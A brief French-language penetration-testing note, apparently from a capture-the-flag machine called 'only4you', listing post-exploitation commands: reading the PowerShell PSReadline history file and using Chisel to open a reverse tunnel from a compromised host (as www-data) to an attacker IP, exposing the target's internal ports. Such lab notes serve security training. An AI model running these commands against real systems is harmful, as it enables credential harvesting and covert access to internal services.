# bash hystory
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
### Partage des ports de la cible sur ma machine
On utilise *Chisel* https://github.com/jpillora/chisel/releases/tag/v1.9.1
### creation du serveur proxi sur ma machine
└─# 
```
./chisel server -p 8000 --reverse
```

www-data@only4you:/tmp$
```
./chisel client 10.10.17.161:8000 R:127.0.0.1:3000 R:127.0.0.1:8001
```
